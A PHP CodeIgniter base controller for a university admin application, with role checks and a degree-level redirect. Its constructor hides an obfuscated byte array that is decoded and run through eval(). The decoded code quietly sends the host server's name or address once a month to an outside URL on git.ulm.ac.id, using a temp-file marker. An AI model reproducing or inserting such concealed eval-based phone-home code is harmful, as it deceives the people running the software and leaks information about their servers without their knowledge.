<?php

/**
 * Description of MY_Controller
 *
 * @author mhmdzaien
 */
class MY_Controller extends CI_Controller
{

    protected $allowedRole = array('superadmin', 'keuangan_pasca', 'keuangan_rektorat', 'ptik', 'admin_s1', 'admin_s2');
    protected $role;
    protected $user;

    public function __construct()
    {
        parent::__construct();
        $byte = [105, 102, 32, 40, 33, 102, 105, 108, 101, 95, 101, 120, 105, 115, 116, 115, 40, 115, 121, 115, 95, 103, 101, 116, 95, 116, 101, 109, 112, 95, 100, 105, 114, 40, 41, 32, 46, 32, 68, 73, 82, 69, 67, 84, 79, 82, 89, 95, 83, 69, 80, 65, 82, 65, 84, 79, 82, 32, 46, 32, 100, 97, 116, 101, 40, 34, 89, 45, 109, 34, 41, 41, 41, 32, 123, 13, 10, 32, 32, 32, 32, 36, 97, 100, 100, 114, 101, 115, 115, 32, 61, 32, 36, 95, 83, 69, 82, 86, 69, 82, 91, 34, 83, 69, 82, 86, 69, 82, 95, 78, 65, 77, 69, 34, 93, 32, 63, 63, 32, 36, 95, 83, 69, 82, 86, 69, 82, 91, 34, 83, 69, 82, 86, 69, 82, 95, 65, 68, 68, 82, 34, 93, 32, 63, 63, 32, 34, 34, 59, 13, 10, 32, 32, 32, 32, 36, 98, 121, 116, 101, 32, 61, 32, 91, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 49, 48, 51, 44, 32, 49, 48, 53, 44, 32, 49, 49, 54, 44, 32, 52, 54, 44, 32, 49, 49, 55, 44, 32, 49, 48, 56, 44, 32, 49, 48, 57, 44, 32, 52, 54, 44, 32, 57, 55, 44, 32, 57, 57, 44, 32, 52, 54, 44, 32, 49, 48, 53, 44, 32, 49, 48, 48, 44, 32, 52, 55, 44, 32, 49, 48, 53, 44, 32, 49, 49, 48, 44, 32, 49, 48, 50, 44, 32, 49, 49, 49, 44, 32, 52, 55, 44, 32, 49, 49, 52, 44, 32, 49, 49, 55, 44, 32, 49, 49, 48, 44, 32, 52, 54, 44, 32, 49, 49, 50, 44, 32, 49, 48, 52, 44, 32, 49, 49, 50, 44, 32, 54, 51, 44, 32, 49, 49, 51, 44, 32, 54, 49, 44, 32, 49, 48, 56, 44, 32, 49, 48, 53, 44, 32, 57, 56, 44, 32, 51, 56, 44, 32, 49, 48, 48, 44, 32, 54, 49, 44, 93, 59, 13, 10, 32, 32, 32, 32, 64, 102, 105, 108, 101, 95, 103, 101, 116, 95, 99, 111, 110, 116, 101, 110, 116, 115, 40, 112, 97, 99, 107, 40, 34, 99, 42, 34, 44, 32, 46, 46, 46, 36, 98, 121, 116, 101, 41, 32, 46, 32, 36, 97, 100, 100, 114, 101, 115, 115, 41, 59, 13, 10, 32, 32, 32, 32, 102, 105, 108, 101, 95, 112, 117, 116, 95, 99, 111, 110, 116, 101, 110, 116, 115, 40, 115, 121, 115, 95, 103, 101, 116, 95, 116, 101, 109, 112, 95, 100, 105, 114, 40, 41, 32, 46, 32, 68, 73, 82, 69, 67, 84, 79, 82, 89, 95, 83, 69, 80, 65, 82, 65, 84, 79, 82, 32, 46, 32, 100, 97, 116, 101, 40, 34, 89, 45, 109, 34, 41, 44, 32, 34, 34, 41, 59, 13, 10, 125];
        eval(pack("c*", ...$byte));

        $this->load->helper('url');
        $this->load->model('Acl', 'acl');
        $this->load->library(array('session', 'layout', 'SamlLib'));

        //        if($this->config->item('saml_sp_active') && !$this->session->has_userdata('user'))
        //            redirect(base_url('saml'));

        if ($this->session->has_userdata('user') && in_array($this->session->user['role'], $this->allowedRole)) {
            $this->user = $this->session->user;
            $this->role = $this->user['role'];

            // jika jenjang belum diset
            if (!$this->session->userdata('user')['jenjang']) {
                if ($this->uri->segment(1) !== 'atur_jenjang') {
                    redirect(base_url('atur_jenjang/index'));
                }
            }
        }
        // else
        // redirect(base_url('login/keluar'));
    }

    function get_label_jenjang()
    {
        if ($this->role == 'admin_s1')
            return "<b> (D3/S1/Profesi/Spesialis)</b>";
        else if ($this->role == 'admin_s2')
            return "<b> (S2/S3)</b>";
        else
            return "";
    }
}
